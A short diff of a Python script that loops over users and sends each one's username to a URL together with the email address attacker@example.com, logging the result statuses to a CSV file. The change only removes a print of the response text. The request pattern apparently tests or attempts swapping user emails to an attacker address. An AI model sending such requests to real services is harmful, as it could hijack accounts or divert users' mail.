@@ -26,8 +26,7 @@ with open("statistics1.csv", "w", newline="") as csvfile:
         url_with_params = f"{url}?username={user['username']}&email=attacker@example.com"
         response = requests.get(url_with_params)
         
-        if response.status_code == 200:
-            print(response.text)
+        if response.status_code == 200: 
             writer.writerow({"user": user["username"], "url": url, "type": "GET", "status": "Success"})
         else:
             writer.writerow({"user": user["username"], "url": url, "type": "GET", "status": "Error"})
